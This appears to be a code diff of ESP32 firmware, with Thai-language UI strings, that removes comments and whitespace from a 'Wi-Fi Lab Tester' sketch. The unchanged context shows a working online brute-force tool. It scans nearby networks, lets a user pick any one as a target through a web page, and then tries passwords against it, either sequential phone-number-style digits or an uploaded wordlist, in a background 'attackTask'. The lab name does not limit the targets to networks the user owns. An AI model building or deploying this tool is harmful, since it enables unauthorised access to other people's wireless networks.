@@ -2,13 +2,11 @@
 #include <WebServer.h>
 #include <LittleFS.h>
 
-// ตั้งค่า Wi-Fi ที่ ESP32 จะปล่อยออกมา
 const char* ap_ssid = "ESP32-SecurityLab";
-const char* ap_pass = "12345678"; 
+const char* ap_pass = "12345678";
 
 WebServer server(80);
 
-// ตัวแปรควบคุมระบบ
 String scannedNetworksJSON = "[]";
 String targetSSID = "";
 String currentCandidate = "";
@@ -17,13 +15,12 @@ String attackMode = "";
 bool isTesting = false;
 bool isFound = false;
 unsigned long attemptCount = 0;
-unsigned long currentNumberBase = 80000000; // ค่าเริ่มต้นสำหรับโหมด Sequential (080...)
+unsigned long currentNumberBase = 80000000;
 
 TaskHandle_t attackTaskHandle = NULL;
-File wordlistFile; // สำหรับอ่านรหัสผ่านตอนทดสอบ
-File uploadFile;   // สำหรับรับไฟล์จากหน้าเว็บ
+File wordlistFile;
+File uploadFile;
 
-// โค้ดหน้าเว็บหลัก
 const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html lang="th">
@@ -49,7 +46,7 @@ const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <body>
   <div class="card">
     <h2>Wi-Fi Lab Tester</h2>
-    
+
     <label for="ssidList">เลือกเป้าหมายที่ตรวจพบ:</label>
     <select id="ssidList"><option value="">กำลังโหลดรายการ...</option></select>
 
@@ -116,7 +113,6 @@ const char INDEX_HTML[] PROGMEM = R"rawliteral(
 </html>
 )rawliteral";
 
-// โค้ดหน้าอัปโหลดไฟล์
 const char UPLOAD_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html lang="th">
@@ -132,29 +128,26 @@ const char UPLOAD_HTML[] PROGMEM = R"rawliteral(
 </html>
 )rawliteral";
 
-// Task ทำงานเบื้องหลังสำหรับสุ่มรหัสผ่าน
 void attackTask(void *pvParameters) {
   for (;;) {
     if (isTesting && !isFound && targetSSID != "") {
       attemptCount++;
-      
+
       if (attackMode == "sequential") {
         currentCandidate = "0" + String(currentNumberBase);
         currentNumberBase++;
-      } 
+      }
       else if (attackMode == "wordlist") {
         if (wordlistFile && wordlistFile.available()) {
           currentCandidate = wordlistFile.readStringUntil('\n');
-          
-          // ล้างอักขระซ่อนเร้น \r และ \n ที่มาจากระบบปฏิบัติการ
+
           currentCandidate.replace("\r", "");
           currentCandidate.replace("\n", "");
-          currentCandidate.trim(); 
-          
-          // ถ้าบรรทัดว่างเปล่าให้ข้ามไป
-          if(currentCandidate.length() == 0) continue; 
+          currentCandidate.trim();
+
+          if(currentCandidate.length() == 0) continue;
         } else {
-          isTesting = false; 
+          isTesting = false;
           Serial.println("Wordlist finished.");
           if (wordlistFile) wordlistFile.close();
           continue;
@@ -162,8 +155,7 @@ void attackTask(void *pvParameters) {
       }
 
       Serial.printf("Testing [%d chars]: %s\n", currentCandidate.length(), currentCandidate.c_str());
-      
-      // ล้างสถานะเก่าก่อนเริ่มทดสอบรหัสใหม่
+
       WiFi.disconnect(true);
       vTaskDelay(500 / portTICK_PERIOD_MS);
 
@@ -192,11 +184,10 @@ void attackTask(void *pvParameters) {
   }
 }
 
-// ฟังก์ชันสแกน Wi-Fi รอบตัว 1 รอบ
 void performSingleScan() {
   Serial.println("กำลังสแกน Wi-Fi...");
   int n = WiFi.scanNetworks();
-  
+
   scannedNetworksJSON = "[";
   for (int i = 0; i < n; ++i) {
     if (WiFi.SSID(i).length() > 0) {
@@ -205,14 +196,13 @@ void performSingleScan() {
     }
   }
   scannedNetworksJSON += "]";
-  WiFi.scanDelete(); 
+  WiFi.scanDelete();
 }
 
 void setup() {
   Serial.begin(115200);
   delay(1000);
 
-  // เปิดใช้งาน LittleFS
   if (!LittleFS.begin(true)) {
     Serial.println("เกิดข้อผิดพลาดในการโหลด LittleFS");
   }
@@ -221,15 +211,12 @@ void setup() {
   WiFi.disconnect();
   delay(100);
 
-  // 1. สแกน Wi-Fi
   performSingleScan();
 
-  // 2. ปล่อย Wi-Fi 
   WiFi.softAP(ap_ssid, ap_pass);
   Serial.print("Web UI IP: ");
   Serial.println(WiFi.softAPIP());
 
-  // 3. กำหนด Endpoint สำหรับ Web Server
   server.on("/", HTTP_GET, []() {
     server.send_P(200, "text/html", INDEX_HTML);
   });
@@ -242,16 +229,16 @@ void setup() {
     if (server.hasArg("ssid") && server.hasArg("mode")) {
       targetSSID = server.arg("ssid");
       attackMode = server.arg("mode");
-      
+
       attemptCount = 0;
       isFound = false;
       foundPassword = "";
-      currentNumberBase = 80000000; 
-      
+      currentNumberBase = 80000000;
+
       if (attackMode == "wordlist") {
         wordlistFile = LittleFS.open("/passwords.txt", "r");
       }
-      
+
       isTesting = true;
       server.send(200, "text/plain", "Started");
     } else {
@@ -277,12 +264,10 @@ void setup() {
     server.send(200, "application/json", json);
   });
 
-  // Endpoint อัปโหลดไฟล์ (แสดงหน้าเว็บ)
   server.on("/upload", HTTP_GET, []() {
     server.send_P(200, "text/html", UPLOAD_HTML);
   });
 
-  // Endpoint รับไฟล์และเขียนลง LittleFS
   server.on("/upload", HTTP_POST, []() {
     server.send(200, "text/html", "<h2>อัปโหลดสำเร็จ!</h2><a href='/'>กลับหน้าหลัก</a>");
   }, []() {
@@ -298,7 +283,6 @@ void setup() {
 
   server.begin();
 
-  // สร้าง Task รันบน Core 1
   xTaskCreatePinnedToCore(attackTask, "AttackTask", 4096, NULL, 1, &attackTaskHandle, 1);
 }
 
